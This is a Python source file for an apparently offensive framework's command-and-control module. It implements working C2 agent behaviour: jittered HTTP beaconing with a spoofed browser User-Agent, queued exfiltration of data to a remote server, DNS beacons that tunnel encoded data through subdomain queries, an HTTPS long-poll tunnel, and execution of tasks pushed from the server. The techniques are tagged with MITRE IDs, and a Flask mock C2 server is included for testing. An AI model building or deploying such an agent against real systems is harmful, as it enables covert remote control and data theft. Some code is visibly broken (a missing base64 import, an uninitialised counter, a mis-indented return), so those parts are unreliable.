from typing import Dict, Any, Optional, List
from datetime import datetime
import random
import requests
import time
import threading
import logging
import platform
import uuid # For generating a unique agent ID
import string
import json

# Import dnspython if available (for DNS C2 simulation)
try:
    import dns.resolver
    import dns.exception
except ImportError:
    dns = None # Handle optional dependency

class CommandControl:
    """Handles Command and Control operations, including C2 beaconing."""

    def __init__(self, nexus_instance=None):
        self.config = {
            "default_interval_seconds": 60,
            "default_jitter_percent": 20, # Percentage (0-100)
            "default_user_agent": f"Mozilla/5.0 ({platform.system()} {platform.release()}; rv:10.0) Gecko/20100101 Firefox/10.0",
            "default_http_method": "GET",
            "beacon_timeout_seconds": 30, # Timeout for individual HTTP requests
            "max_beacon_attempts": 3, # Max consecutive failures before stopping beacon thread
            "include_task_results_in_beacon": True,
            # Proxy settings (initially None)
            "http_proxy_url": None, 
            "https_proxy_url": None,
            # Default value from core module config
            "modules": {"command_control": {"include_task_results_in_beacon": True}}
        }
        self.logger = logging.getLogger(__name__)
        self.beacon_threads: Dict[str, threading.Event] = {} # Store stop events for active beacons
        self.tunnel_threads: Dict[str, threading.Event] = {} # Store stop events for active tunnels
        self.agent_id = str(uuid.uuid4()) # Generate a unique ID for this agent instance
        self.task_results_queue: List[Dict[str, Any]] = [] # Simple queue for results
        self.outgoing_exfil_queue: List[Dict[str, Any]] = [] # Dedicated queue for exfil data
        self.queue_lock = threading.Lock() # Single lock for both queues for simplicity
        self.nexus = nexus_instance

    def update_config(self, config: Dict[str, Any]):
        """Update internal config with loaded configuration."""
        # Load general C2 config first
        c2_config = config.get("command_control", {})
        self.config.update(c2_config)
        
        # Load specific module config if it exists (might override general)
        module_specific_config = config.get("modules", {}).get("command_control", {})
        self.config.update(module_specific_config)
        
        # Explicitly update proxy settings from the loaded config
        self.config["http_proxy_url"] = self.config.get("http_proxy_url")
        self.config["https_proxy_url"] = self.config.get("https_proxy_url")
        
        self.logger.info("CommandControl module configuration updated.")
        self.logger.debug(f"C2 Proxy Config: HTTP='{self.config['http_proxy_url']}', HTTPS='{self.config['https_proxy_url']}'")

    def _handle_proxy_config(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Updates the proxy configuration for subsequent C2 communications."""
        http_proxy = details.get("http_proxy_url")
        https_proxy = details.get("https_proxy_url")
        # You could add support for proxy type (SOCKS4/5) and auth later if needed
        # For now, we assume standard HTTP/HTTPS proxy URLs
        
        updated = False
        if http_proxy is not None:
            self.config["http_proxy_url"] = http_proxy if http_proxy else None # Allow setting back to None
            self.logger.info(f"Set HTTP proxy for C2 to: {self.config['http_proxy_url']}")
            updated = True
        if https_proxy is not None:
            self.config["https_proxy_url"] = https_proxy if https_proxy else None # Allow setting back to None
            self.logger.info(f"Set HTTPS proxy for C2 to: {self.config['https_proxy_url']}")
            updated = True
            
        if not updated:
             return {"status": "no_op", "reason": "No proxy URLs provided in details.", "operation": "configure_proxy"}
             
        # Proxies will be applied on the next beacon request by _beacon_worker
        return {"status": "success", "message": "C2 proxy configuration updated.", "operation": "configure_proxy"}

    def run_operation(self, data: Dict[str, Any]) -> Dict[str, Any]:
        """Route C2 operation requests to appropriate handlers."""
        operation_type = data.get("operation")
        details = data.get("details", {})
        
        # Add original operation type to details for context
        details['_original_operation_type'] = operation_type 
        
        handler_map = {
            "start_http_beacon": self._handle_http_beacon,
            "stop_http_beacon": self._handle_stop_beacon,
            "configure_proxy": self._handle_proxy_config,
            "proxy_c2": self._handle_proxy_config, 
            "proxy": self._handle_proxy_config,
            "dns_c2": self._handle_dns_c2_beacon, # Added DNS C2 handler
            
            # Other placeholders remain not implemented
            "tunnel_c2": self._start_https_long_poll_tunnel, # Map to new handler
            "tunnel": self._start_https_long_poll_tunnel, # Alias for convenience
            "stop_tunnel": self._handle_stop_tunnel, # Add stop handler
            "custom_protocol_c2": self._handle_not_implemented,
            "fallback_channels": self._handle_not_implemented, 
            "dynamic_resolution": self._handle_not_implemented 
        }
        
        handler = handler_map.get(operation_type)
        
        if handler:
            try:
                # Pass details to the handler
                result = handler(details)
                return result 
            except Exception as e:
                self.logger.error(f"Error during C2 operation '{operation_type}': {e}", exc_info=True)
                return {"status": "error", "message": str(e), "operation": operation_type}
        else:
            error_msg = f"Unsupported C2 operation type: {operation_type}"
            self.logger.error(error_msg)
            return {"status": "error", "message": error_msg, "operation": operation_type}

    def queue_outgoing_data(self, data: Dict[str, Any]):
        """Adds data (like exfil chunks) to the outgoing queue for the next beacon."""
        # Should check data type/size?
        with self.queue_lock:
            self.outgoing_exfil_queue.append(data)
            self.logger.debug(f"Added data of type '{data.get('type')}' to outgoing C2 queue.")

    def _beacon_worker(self, beacon_id: str, stop_event: threading.Event, details: Dict[str, Any]):
        """Worker function for sending HTTP beacons and processing tasks."""
        c2_url = details.get("c2_url")
        interval = details.get("interval_seconds", self.config["default_interval_seconds"])
        jitter = details.get("jitter_percent", self.config["default_jitter_percent"])
        user_agent = details.get("user_agent", self.config["default_user_agent"])
        method = details.get("method", self.config["default_http_method"]).upper()
        additional_headers = details.get("headers", {})
        verify_ssl = details.get("verify_ssl", True)
        timeout = self.config["beacon_timeout_seconds"]
        max_failures = self.config["max_beacon_attempts"]
        failure_count = 0
        include_results = self.config.get("include_task_results_in_beacon", True)
        include_exfil = True

        if not c2_url:
            self.logger.error(f"[Beacon {beacon_id}] C2 URL not provided. Stopping worker.")
            return
        if interval <= 0:
             self.logger.warning(f"[Beacon {beacon_id}] Invalid interval ({interval}), defaulting to 60s.")
             interval = 60
        jitter = max(0, min(100, jitter)) # Clamp jitter between 0 and 100

        headers = {"User-Agent": user_agent, "X-Agent-ID": self.agent_id}
        headers.update(additional_headers)

        self.logger.info(f"[Beacon {beacon_id}] Starting. Target: {c2_url}, Interval: {interval}s, Jitter: {jitter}%")

        while not stop_event.is_set():
            try:
                # Calculate sleep time with jitter
                jitter_amount = (interval * jitter / 100.0)
                sleep_time = interval + random.uniform(-jitter_amount, jitter_amount)
                sleep_time = max(0.1, sleep_time) # Ensure minimum sleep time
                
                self.logger.debug(f"[Beacon {beacon_id}] Sleeping for {sleep_time:.2f} seconds.")
                stop_event.wait(timeout=sleep_time) # Use wait() for interruptible sleep
                if stop_event.is_set(): break # Check again after sleep

                # --- Prepare Beacon Data --- 
                beacon_data = {"agent_id": self.agent_id, "timestamp": datetime.now().isoformat(), "status": "beacon"}
                
                # Include results and exfil data from queues
                with self.queue_lock:
                    if include_results and self.task_results_queue:
                        beacon_data["results"] = self.task_results_queue[:]
                        self.task_results_queue.clear() 
                        self.logger.debug(f"[Beacon {beacon_id}] Including {len(beacon_data['results'])} task results.")
                    if include_exfil and self.outgoing_exfil_queue:
                        # Embed exfil data under a specific key
                        beacon_data["exfil_data"] = self.outgoing_exfil_queue[:]
                        self.outgoing_exfil_queue.clear()
                        self.logger.debug(f"[Beacon {beacon_id}] Including {len(beacon_data['exfil_data'])} exfil chunks.")
                # --- End Prepare Data --- 

                # --- Prepare Proxies --- 
                proxies = {}
                http_proxy = self.config.get("http_proxy_url")
                https_proxy = self.config.get("https_proxy_url")
                if http_proxy:
                    proxies['http'] = http_proxy
                if https_proxy:
                    proxies['https'] = https_proxy
                if proxies:
                     self.logger.debug(f"[Beacon {beacon_id}] Using proxies: {proxies}")
                # --- End Prepare Proxies --- 

                # Send request
                self.logger.debug(f"[Beacon {beacon_id}] Sending {method} beacon to {c2_url}")
                response = None
                task_to_execute = None
                start_time = time.time()
                try:
                    if method == "POST":
                        response = requests.post(c2_url, headers=headers, json=beacon_data, 
                                                 timeout=timeout, verify=verify_ssl, 
                                                 proxies=proxies)
                    else: # GET
                        # GET requests with large payloads (results/exfil) are problematic
                        # Consider switching to POST if exfil/results are expected
                        if "results" in beacon_data or "exfil_data" in beacon_data:
                             self.logger.warning(f"[Beacon {beacon_id}] Beacon contains results/exfil data but method is GET. Data might be lost or request may fail.")
                             # Optionally truncate or remove results/exfil for GET?
                        
                        get_params = {}
                        for k, v in beacon_data.items():
                             if isinstance(v, (dict, list)): # Attempt to JSON encode complex types
                                  try: get_params[k] = json.dumps(v)
                                  except Exception: get_params[k] = str(v)[:1000] # Limit length if cannot encode
                             else: get_params[k] = v
                        response = requests.get(c2_url, headers=headers, params=get_params, 
                                                timeout=timeout, verify=verify_ssl, 
                                                proxies=proxies)
                    
                    response.raise_for_status() # Raise exception for bad status codes (4xx or 5xx)
                    
                    # Process response 
                    self.logger.info(f"[Beacon {beacon_id}] Beacon sent successfully. Status: {response.status_code}. Response snippet: {response.text[:100]}")
                    # Reset failure count on success
                    failure_count = 0
                    
                    # --- TASKING IMPLEMENTATION ---
                    # Attempt to parse response as JSON for tasks
                    try:
                        # Simulate receiving a task if response is empty or non-JSON
                        # In a real C2, the server would send JSON tasks.
                        if not response.text or not response.headers.get('content-type', '').startswith('application/json'):
                             # Simulate receiving a discovery task periodically
                             if random.random() < 0.3: # ~30% chance per beacon
                                  task_to_execute = {
                                      "task_id": f"task_{self._generate_random_string(6)}",
                                      "module": "discovery",
                                      "operation_data": {
                                          "discover": {"system_info": True, "process_info": True}
                                      }
                                  }
                                  self.logger.info(f"[Beacon {beacon_id}] SIMULATED received task: {task_to_execute}")
                        else:
                             # Attempt to parse actual JSON response for tasks
                             tasks = response.json()
                             if isinstance(tasks, list) and tasks: # Check if it's a non-empty list
                                  task_to_execute = tasks[0] # Process first task for simplicity
                                  self.logger.info(f"[Beacon {beacon_id}] Received task from C2: {task_to_execute}")
                             elif isinstance(tasks, dict) and tasks: # Handle single task object
                                   task_to_execute = tasks
                                   self.logger.info(f"[Beacon {beacon_id}] Received task from C2: {task_to_execute}")
                    except json.JSONDecodeError:
                         self.logger.debug(f"[Beacon {beacon_id}] Response was not valid JSON, no tasks received.")
                    except Exception as task_err:
                         self.logger.warning(f"[Beacon {beacon_id}] Could not parse tasks from response: {task_err}")
                    # ---------------------------

                except requests.exceptions.RequestException as req_err:
                    failure_count += 1
                    self.logger.warning(f"[Beacon {beacon_id}] Request failed ({failure_count}/{max_failures}): {req_err}")
                    if failure_count >= max_failures:
                         self.logger.error(f"[Beacon {beacon_id}] Max beacon failures reached ({max_failures}). Stopping worker.")
                         break # Exit loop
                except Exception as e:
                    failure_count += 1
                    self.logger.error(f"[Beacon {beacon_id}] Unexpected error during beacon ({failure_count}/{max_failures}): {e}", exc_info=True)
                    if failure_count >= max_failures:
                         self.logger.error(f"[Beacon {beacon_id}] Max beacon failures reached ({max_failures}) due to unexpected errors. Stopping worker.")
                         break # Exit loop
                    
                # --- Execute Task if received ---
                if task_to_execute:
                    self._execute_received_task(task_to_execute)
                # --------------------------------
                    
            except Exception as outer_e:
                 # Catch errors in sleep/calculation logic
                 self.logger.error(f"[Beacon {beacon_id}] Error in main beacon loop: {outer_e}", exc_info=True)
                 time.sleep(5) # Prevent rapid spinning on unexpected errors

        self.logger.info(f"[Beacon {beacon_id}] Beacon worker thread stopped.")
        # Clean up beacon_id from the active threads dict
        if beacon_id in self.beacon_threads:
             del self.beacon_threads[beacon_id]

    def _handle_http_beacon(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Starts the HTTP beaconing process in a separate thread."""
        beacon_id = details.get("beacon_id", f"beacon_{self._generate_random_string(6)}")
        c2_url = details.get("c2_url")

        if not c2_url:
            return {"status": "error", "message": "Missing 'c2_url' detail for starting beacon."} 

        if beacon_id in self.beacon_threads:
            self.logger.warning(f"Beacon with ID '{beacon_id}' is already running.")
            return {"status": "skipped", "message": f"Beacon '{beacon_id}' already active.", "beacon_id": beacon_id}

        self.logger.info(f"Received request to start HTTP beacon: {beacon_id}")
        stop_event = threading.Event()
        self.beacon_threads[beacon_id] = stop_event
        
        thread = threading.Thread(target=self._beacon_worker, 
                                  args=(beacon_id, stop_event, details), 
                                  daemon=True) # Daemon threads exit when main program exits
        thread.start()
        
        self.logger.info(f"HTTP beacon thread '{beacon_id}' started.")
        
        return {
            "status": "success",
            "technique": "c2_http_beacon_start",
            "mitre_technique_id": "T1071.001", # Application Layer Protocol: Web Protocols
            "mitre_technique_name": "Application Layer Protocol: Web Protocols",
            "timestamp": datetime.now().isoformat(),
            "details": {"beacon_id": beacon_id, "message": "Beacon thread started successfully."}
        }

    def _handle_stop_beacon(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Stops a specific running beacon thread."""
        beacon_id = details.get("beacon_id")

        if not beacon_id:
            return {"status": "error", "message": "Missing 'beacon_id' detail for stopping beacon."}
            
        self.logger.info(f"Received request to stop beacon: {beacon_id}")
        stop_event = self.beacon_threads.get(beacon_id)
        
        if stop_event:
            stop_event.set() # Signal the thread to stop
            # Optionally wait for thread to finish with timeout?
            # Consider thread.join(timeout=...) if needed
            if beacon_id in self.beacon_threads:
                 del self.beacon_threads[beacon_id] # Remove immediately, worker cleans up too
            self.logger.info(f"Stop signal sent to beacon thread: {beacon_id}")
            return {"status": "success", "message": f"Stop signal sent to beacon '{beacon_id}'.", "beacon_id": beacon_id}
        else:
            self.logger.warning(f"Beacon thread '{beacon_id}' not found or already stopped.")
            return {"status": "skipped", "message": f"Beacon '{beacon_id}' not found or already stopped.", "beacon_id": beacon_id}

    def stop_beaconing(self):
        """Stops all running beacon threads initiated by this module instance."""
        self.logger.info("Stopping all active beacon threads...")
        active_beacon_ids = list(self.beacon_threads.keys())
        for beacon_id in active_beacon_ids:
            self._handle_stop_beacon({"beacon_id": beacon_id})
        self.logger.info("All active beacon threads signaled to stop.")

    def _handle_dns_c2_beacon(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Simulates sending a C2 beacon via DNS query."""
        if not dns:
            return {"status": "error", "reason": "dnspython library not installed. Cannot use DNS C2."}

        controlled_domain = details.get("controlled_domain")
        beacon_data_str = details.get("beacon_data", f"agent={self.agent_id}_status=ok") # Example simple data
        query_type = details.get("query_type", "A").upper()
        max_label_len = details.get("max_label_length", 60)
        mitre_id = "T1071.004" # Application Layer Protocol: DNS
        mitre_name = "Command and Control: Application Layer Protocol: DNS"

        if not controlled_domain:
            return {"status": "error", "reason": "Missing 'controlled_domain' for dns_c2."}
        
        status = "failure"
        reason = ""
        queries_sent = 0
        result_details = {
             "controlled_domain": controlled_domain,
             "query_type": query_type,
             "beacon_data_snippet": beacon_data_str[:100] + ("..." if len(beacon_data_str) > 100 else ""),
             "fqdn_generated": None,
             "query_status": None
        }

        self.logger.info(f"Simulating DNS C2 beacon to {controlled_domain}")

        try:
            # Encode data (Base32 suitable for DNS)
            encoded_data = base64.b32encode(beacon_data_str.encode()).decode('ascii').rstrip('=')
            
            # Truncate/chunk if needed (simple truncation for this simulation)
            if len(encoded_data) > max_label_len:
                self.logger.warning(f"Encoded data ({len(encoded_data)} chars) longer than max label length ({max_label_len}). Truncating.")
                encoded_data = encoded_data[:max_label_len]
                
            # Construct FQDN
            fqdn = f"{encoded_data}.{controlled_domain}"
            result_details["fqdn_generated"] = fqdn
            
            if len(fqdn) > 253 or any(len(label) > 63 for label in fqdn.split('.')):
                 raise ValueError(f"Generated FQDN is invalid or too long: {fqdn[:100]}...")

            # Perform DNS query (simulation - we don't expect a specific answer)
            resolver = dns.resolver.Resolver()
            resolver.timeout = details.get("dns_timeout", 2)
            resolver.lifetime = details.get("dns_lifetime", 5)
            self.logger.debug(f"Sending DNS query ({query_type}) for: {fqdn}")
            
            try:
                 answers = resolver.resolve(fqdn, query_type, raise_on_no_answer=False)
                 result_details["query_status"] = "Query sent (received response/no answer)"
                 self.logger.info(f"Simulated DNS beacon sent. Query for {fqdn} completed.")
                 successful_queries += 1
            except dns.resolver.NXDOMAIN:
                 result_details["query_status"] = "Query sent (NXDOMAIN received - expected for passive C2)"
                 self.logger.info(f"Simulated DNS beacon sent. Query for {fqdn} received NXDOMAIN (expected)." )
                 successful_queries += 1
            except dns.exception.Timeout:
                 reason = f"DNS query for {fqdn} timed out."
                 result_details["query_status"] = "Timeout"
                 self.logger.warning(reason)
                 status = "failure"
            except dns.exception.DNSException as dns_err:
                 reason = f"DNS query for {fqdn} failed: {dns_err}"
                 result_details["query_status"] = f"DNS Error: {dns_err}"
                 self.logger.warning(reason)
                 status = "failure"

            if successful_queries > 0: 
                 status = "success"
                 reason = "DNS C2 beacon simulation query sent."
                 
        except ValueError as ve:
             reason = f"Failed to construct valid DNS query: {ve}"
             self.logger.error(reason)
             result_details["error"] = reason
             status = "error"
        except Exception as e:
            reason = f"Error during DNS C2 simulation: {e}"
            self.logger.error(reason, exc_info=True)
            result_details["error"] = str(e)
            status = "error"

        return {
            "status": status,
            "technique": "dns_c2_beacon_simulation",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": result_details,
            "reason": reason if status != "success" else None
        }

    def _https_long_poll_worker(self, tunnel_id: str, stop_event: threading.Event, details: Dict[str, Any]):
        """Worker function for HTTPS long polling C2."""
        target_url = details.get("target_url")
        interval = details.get("interval_seconds", 5) # Time between polls *after* completion/error
        jitter = details.get("jitter_percent", 10) # Jitter for interval
        user_agent = details.get("user_agent", self.config["default_user_agent"])
        additional_headers = details.get("headers", {})
        verify_ssl = details.get("verify_ssl", True)
        # Long poll timeout: how long agent waits for server response
        # Server should ideally hold connection slightly less than this
        poll_timeout = details.get("poll_timeout_seconds", 120) 
        max_failures = self.config["max_beacon_attempts"] # Reuse beacon failure limit
        failure_count = 0
        include_results = self.config.get("include_task_results_in_beacon", True)
        include_exfil = True

        if not target_url:
            self.logger.error(f"[Tunnel {tunnel_id}] Target URL not provided. Stopping worker.")
            return
        if interval <= 0: interval = 5
        jitter = max(0, min(100, jitter)) 
        poll_timeout = max(10, poll_timeout) # Ensure reasonable minimum poll time

        headers = {"User-Agent": user_agent, "X-Agent-ID": self.agent_id}
        headers.update(additional_headers)

        self.logger.info(f"[Tunnel {tunnel_id}] Starting HTTPS Long Poll. Target: {target_url}, Poll Timeout: {poll_timeout}s")

        while not stop_event.is_set():
            task_to_execute = None
            try:
                # --- Prepare Data to Send --- 
                post_data = {"agent_id": self.agent_id, "timestamp": datetime.now().isoformat(), "status": "polling"}
                with self.queue_lock:
                    if include_results and self.task_results_queue:
                        post_data["results"] = self.task_results_queue[:]
                        self.task_results_queue.clear()
                        self.logger.debug(f"[Tunnel {tunnel_id}] Including {len(post_data['results'])} task results.")
                    if include_exfil and self.outgoing_exfil_queue:
                        post_data["exfil_data"] = self.outgoing_exfil_queue[:]
                        self.outgoing_exfil_queue.clear()
                        self.logger.debug(f"[Tunnel {tunnel_id}] Including {len(post_data['exfil_data'])} exfil chunks.")
                # --- End Prepare Data ---

                # --- Prepare Proxies --- 
                proxies = {}
                http_proxy = self.config.get("http_proxy_url")
                https_proxy = self.config.get("https_proxy_url")
                if http_proxy and target_url.startswith('http://'): proxies['http'] = http_proxy
                if https_proxy and target_url.startswith('https://'): proxies['https'] = https_proxy
                if proxies: self.logger.debug(f"[Tunnel {tunnel_id}] Using proxies: {proxies}")
                # --- End Prepare Proxies --- 

                # --- Make Long Poll Request --- 
                self.logger.debug(f"[Tunnel {tunnel_id}] Sending POST poll request to {target_url} (timeout: {poll_timeout}s)")
                start_time = time.time()
                response = requests.post(target_url, headers=headers, json=post_data, 
                                         timeout=poll_timeout, verify=verify_ssl,
                                         proxies=proxies)
                duration = time.time() - start_time
                self.logger.debug(f"[Tunnel {tunnel_id}] Poll request completed in {duration:.3f}s (Status: {response.status_code})")
                
                response.raise_for_status() # Check for 4xx/5xx errors
                failure_count = 0 # Reset failures on successful poll

                # --- Process Response / Tasking --- 
                try:
                    if response.text and response.headers.get('content-type', '').startswith('application/json'):
                        tasks = response.json()
                        if isinstance(tasks, list) and tasks:
                            task_to_execute = tasks[0] # Process first task
                            self.logger.info(f"[Tunnel {tunnel_id}] Received task from C2: {task_to_execute}")
                        elif isinstance(tasks, dict) and tasks: # Handle single task object
                            task_to_execute = tasks
                            self.logger.info(f"[Tunnel {tunnel_id}] Received task from C2: {task_to_execute}")
                        else:
                            self.logger.debug(f"[Tunnel {tunnel_id}] Poll response OK, but no tasks received.")
                    else:
                         self.logger.debug(f"[Tunnel {tunnel_id}] Poll response OK, empty or non-JSON response.")
                except json.JSONDecodeError:
                     self.logger.warning(f"[Tunnel {tunnel_id}] Failed to decode JSON response: {response.text[:100]}")
                except Exception as task_err:
                     self.logger.warning(f"[Tunnel {tunnel_id}] Error processing C2 response: {task_err}")
                # --------------------------------
                
            except requests.exceptions.Timeout:
                 self.logger.debug(f"[Tunnel {tunnel_id}] Poll request timed out after {poll_timeout}s (as expected if no tasks).")
                 failure_count = 0 # Timeout is not necessarily an error in long polling
            except requests.exceptions.RequestException as req_err:
                 failure_count += 1
                 self.logger.warning(f"[Tunnel {tunnel_id}] Poll request failed ({failure_count}/{max_failures}): {req_err}")
                 if failure_count >= max_failures:
                      self.logger.error(f"[Tunnel {tunnel_id}] Max poll failures reached ({max_failures}). Stopping tunnel.")
                      stop_event.set()
                 # Apply jittered interval sleep on failure before retrying
                 jitter_amount = (interval * jitter / 100.0)
                 sleep_time = interval + random.uniform(-jitter_amount, jitter_amount)
                 sleep_time = max(0.1, sleep_time)
                 stop_event.wait(timeout=sleep_time)
            except Exception as e:
                 failure_count += 1
                 self.logger.error(f"[Tunnel {tunnel_id}] Unexpected error in poll worker ({failure_count}/{max_failures}): {e}", exc_info=True)
                 if failure_count >= max_failures:
                      self.logger.error(f"[Tunnel {tunnel_id}] Max poll failures reached due to unexpected error. Stopping tunnel.")
                      stop_event.set()
                 stop_event.wait(timeout=interval) # Basic sleep on unexpected error
                 
            # --- Execute Task if received --- 
            if task_to_execute:
                self._execute_received_task(task_to_execute)
            # --------------------------------

            # Apply short interval+jitter *only if* connection failed or task was processed
            # Otherwise, loop immediately to poll again after success/timeout
            if failure_count > 0 or task_to_execute:
                if not stop_event.is_set():
                     jitter_amount = (interval * jitter / 100.0)
                     sleep_time = interval + random.uniform(-jitter_amount, jitter_amount)
                     sleep_time = max(0.1, sleep_time)
                     self.logger.debug(f"[Tunnel {tunnel_id}] Sleeping for {sleep_time:.2f}s before next poll.")
                     stop_event.wait(timeout=sleep_time)
            # If successful poll but no task, immediately poll again

        self.logger.info(f"[Tunnel {tunnel_id}] HTTPS Long Poll worker thread stopped.")
        if tunnel_id in self.tunnel_threads:
             del self.tunnel_threads[tunnel_id]

    def _start_https_long_poll_tunnel(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Starts an HTTPS long polling C2 tunnel thread."""
        tunnel_id = details.get("tunnel_id", f"tunnel_{self._generate_random_string(6)}")
        target_url = details.get("target_url")
        mitre_id = "T1572"
        mitre_name = "Protocol Tunneling"

        if not target_url or not target_url.startswith('https://'):
            return {"status": "error", "message": "Missing or invalid (non-HTTPS) 'target_url' detail.", "operation": "start_tunnel"}

        if tunnel_id in self.tunnel_threads:
            self.logger.warning(f"Tunnel with ID '{tunnel_id}' is already running.")
            return {"status": "skipped", "message": f"Tunnel '{tunnel_id}' already active.", "tunnel_id": tunnel_id}

        self.logger.info(f"Received request to start HTTPS long poll tunnel: {tunnel_id}")
        stop_event = threading.Event()
        self.tunnel_threads[tunnel_id] = stop_event
        
        thread = threading.Thread(target=self._https_long_poll_worker, 
                                  args=(tunnel_id, stop_event, details), 
                                  daemon=True, name=f"Tunnel-{tunnel_id}") 
        thread.start()
        
        self.logger.info(f"HTTPS long poll tunnel thread '{tunnel_id}' started.")
        
         return {
            "status": "success",
            "technique": "c2_https_long_poll",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
             "timestamp": datetime.now().isoformat(),
            "details": {"tunnel_id": tunnel_id, "message": "HTTPS long poll tunnel started successfully."}
        }

    def _handle_stop_tunnel(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Stops a specific running tunnel thread."""
        tunnel_id = details.get("tunnel_id")

        if not tunnel_id:
            return {"status": "error", "message": "Missing 'tunnel_id' detail for stopping tunnel.", "operation": "stop_tunnel"}
            
        self.logger.info(f"Received request to stop tunnel: {tunnel_id}")
        stop_event = self.tunnel_threads.get(tunnel_id)
        
        if stop_event:
            stop_event.set() 
            if tunnel_id in self.tunnel_threads:
                 del self.tunnel_threads[tunnel_id] # Remove immediately
            self.logger.info(f"Stop signal sent to tunnel thread: {tunnel_id}")
            return {"status": "success", "message": f"Stop signal sent to tunnel '{tunnel_id}'.", "tunnel_id": tunnel_id}
        else:
            self.logger.warning(f"Tunnel thread '{tunnel_id}' not found or already stopped.")
            return {"status": "skipped", "message": f"Tunnel '{tunnel_id}' not found or already stopped.", "tunnel_id": tunnel_id}

    def _handle_not_implemented(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Placeholder for not-yet-implemented C2 operations."""
        op_type = details.get('_original_operation_type', 'Unknown')
        reason = f"C2 technique '{op_type}' is not implemented."
        self.logger.warning(reason)
        # Return the original technique name if possible
        return {"status": "not_implemented", "reason": reason, "operation": op_type}
            
    def _log_error(self, message: str, exc_info=False) -> None:
        """Log errors using the initialized logger."""
        self.logger.error(message, exc_info=exc_info)
        
    def _generate_random_string(self, length: int = 8) -> str:
        """Generate a random string of fixed length."""
        letters = string.ascii_lowercase + string.digits
        return ''.join(random.choice(letters) for i in range(length))

    def _execute_received_task(self, task: Dict[str, Any]):
        """Executes a task received from the C2 server and queues the result."""
        task_id = task.get("task_id", f"task_{self._generate_random_string(4)}")
        module = task.get("module")
        operation_data = task.get("operation_data")
        
        self.logger.info(f"Executing received task ID: {task_id}, Module: {module}")
        
        result_payload = {
            "task_id": task_id,
            "status": "failure", # Default to failure
            "execution_timestamp": datetime.now().isoformat(),
            "result_data": {}
        }
        
        if not module or not operation_data:
            self.logger.error(f"Task {task_id} is invalid (missing module or operation_data). Skipping.")
            result_payload["result_data"] = {"error": "Invalid task format received."}
        elif not self.nexus:
            self.logger.error(f"Nexus instance not available in C2 module. Cannot execute task {task_id}.")
            result_payload["result_data"] = {"error": "Nexus instance unavailable."} 
        else:
            try:
                # Execute the operation using the main Nexus instance
                task_result = self.nexus.execute_operation(module, operation_data)
                
                # Prepare the result payload
                result_payload["status"] = task_result.get("status", "unknown")
                result_payload["result_data"] = task_result # Include the full result dict
                self.logger.info(f"Task {task_id} ({module}) execution finished with status: {result_payload['status']}")
                
            except Exception as e:
                self.logger.error(f"Exception executing task {task_id} ({module}): {e}", exc_info=True)
                result_payload["result_data"] = {"error": f"Exception during execution: {e}"}

        # Queue the result for the next beacon
        # Only queue if the config allows including results
        if self.config.get("include_task_results_in_beacon", True):
             with self.queue_lock:
                  self.task_results_queue.append(result_payload)
                  self.logger.debug(f"Queued result for task {task_id}")
        else:
             self.logger.debug(f"Task results configured to not be sent via beacon. Discarding result for task {task_id}.")

# Example Usage (for testing)
if __name__ == '__main__':
    import json
    import inspect # For _handle_not_implemented helper
    
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(threadName)s - %(levelname)s - %(message)s')

    try:
        from flask import Flask, request, jsonify
        mock_server = Flask(__name__)
        tasks_to_send = [] 
        mock_c2_logger = logging.getLogger("MockC2")

        @mock_server.route('/c2', methods=['GET', 'POST'])
        def handle_beacon():
            agent_id = request.headers.get('X-Agent-ID') or request.args.get('agent_id')
            mock_c2_logger.info(f"Received beacon from Agent: {agent_id}")
            received_data = {}
            exfil_chunks_received = []
            if request.method == 'POST':
                try: 
                    received_data = request.json
                    mock_c2_logger.info(f"Received POST Data (keys): {list(received_data.keys())}")
                    if "exfil_data" in received_data:
                         exfil_chunks_received = received_data["exfil_data"]
                         mock_c2_logger.info(f"---> Received {len(exfil_chunks_received)} exfil chunks via POST.")
                         # Basic reassembly check
                         if exfil_chunks_received:
                             mock_c2_logger.info(f"    First chunk: session={exfil_chunks_received[0].get('session_id')}, index={exfil_chunks_received[0].get('chunk_index')}, last={exfil_chunks_received[0].get('is_last')}")
                             if len(exfil_chunks_received) > 1:
                                  mock_c2_logger.info(f"    Last chunk: session={exfil_chunks_received[-1].get('session_id')}, index={exfil_chunks_received[-1].get('chunk_index')}, last={exfil_chunks_received[-1].get('is_last')}")
                             
                    if "results" in received_data:
                         mock_c2_logger.info(f"---> Received {len(received_data['results'])} task results via POST.")
                         
                except Exception as e:
                     mock_c2_logger.warning(f"Could not parse POST JSON: {e}")
            else: # GET
                received_data = request.args.to_dict()
                mock_c2_logger.info(f"Received GET Params: {received_data}")
                # Decode results/exfil if present in GET params
                for key in ['results', 'exfil_data']:
                    if key in received_data:
                         try: 
                              decoded_data = json.loads(received_data[key])
                              mock_c2_logger.info(f"---> Received {len(decoded_data)} {key} items via GET param.")
                         except Exception as e: mock_c2_logger.warning(f"Could not decode {key} from GET: {e}")
                     
            # Send back tasks
            response_tasks = tasks_to_send[:]
            tasks_to_send.clear() 
            mock_c2_logger.info(f"Sending {len(response_tasks)} tasks to agent {agent_id}")
            return jsonify(response_tasks)
            
        def run_mock_server():
            werkzeug_log = logging.getLogger('werkzeug')
            werkzeug_log.setLevel(logging.ERROR)
            mock_c2_logger.info("Starting mock server...")
            mock_server.run(host='0.0.0.0', port=8080)
            
        server_thread = threading.Thread(target=run_mock_server, daemon=True, name="MockC2ServerThread")
        server_thread.start()
        logging.info("Mock C2 server starting on port 8080...")
        time.sleep(2)
    except ImportError:
        logging.error("Flask not installed. Cannot run mock C2 server. `pip install Flask`")
        test_c2_url = "http://localhost:9999/nonexistent"
    else:
         test_c2_url = "http://127.0.0.1:8080/c2"
    # ------------------------

    # ... (MockNexus setup remains the same) ...
    class MockNexus:
        def execute_operation(self, module_name: str, operation_data: Dict[str, Any]) -> Dict[str, Any]:
            print(f"\n<------ [MockNexus] Received task! Module: '{module_name}', Data: {operation_data} ------>\n")
            time.sleep(0.5)
            return {"status": "success", "message": f"Task executed by MockNexus for {module_name}", "module": module_name}
            
    mock_nexus_instance = MockNexus()
